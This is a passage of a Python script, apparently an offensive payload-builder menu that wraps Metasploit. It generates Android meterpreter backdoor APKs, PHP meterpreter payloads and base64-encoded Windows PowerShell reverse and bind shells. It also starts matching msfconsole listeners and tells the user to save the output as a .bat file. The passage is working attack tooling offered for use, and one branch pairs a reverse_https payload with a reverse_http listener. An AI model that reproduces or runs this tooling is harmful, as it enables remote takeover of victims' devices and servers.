                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/meterpreter/reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif andr1 == "5":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/meterpreter/reverse_https LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/meterpreter/reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()  
                elif andr1 == "6":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif andr1 == "7":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/meterpreter_reverse_http LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
                elif andr1 == "8":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/meterpreter_reverse_https LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()    
                elif andr1 == "9":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform android -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o backdoor.apk".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "android/meterpreter_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()
            elif paylo == "5":
                print("""
[1] > php/meterpreter/reverse_tcp

""")
                php1 = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST ==> "))
                port1 = str(input("LPORT ==> "))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if php1 == "1":
                    bassem = str(input("[?] Do you really wanna generate this payload ?  Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform php -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1}".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                       
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "php/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.ext()            
        elif your_choice == "5":
            begining.slowprints1    ("""
PAYLOADS AVAIBLE :
 
[1] > Windows
""")           
            pay = str(input("[@: ]>  "))
            cats = ""
            if pay == "1": 
                print("""
[1] > windows/x64/powershell_reverse_tcp
|2] > windows/x64/powershell_bind_tcp
[3] > windows/powershell_reverse_tcp
[4] > windows/powershell_bind_tcp
[5] > cmd/windows/reverse_powershell
[6] > cmd/windows/powershell_reverse_tcp
[7] > cmd/windows/powershell_bind_tcp
""")  
                pwin = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST ==> "))
                port1 = str(input("LPORT ==> "))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if pwin == "1":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/x64/powershell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/x64/powershell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()      
                elif pwin == "2":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/x64/powershell_bind_tcp LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/x64/powershell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/x64/powershell_bind_tcp LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/x64/powershell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()          
                elif pwin == "3":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/powershell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/powershell_reverse_tcp LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/powershell_reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()        
                elif pwin == "4":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/powershell_bind_tcp LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/powershell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
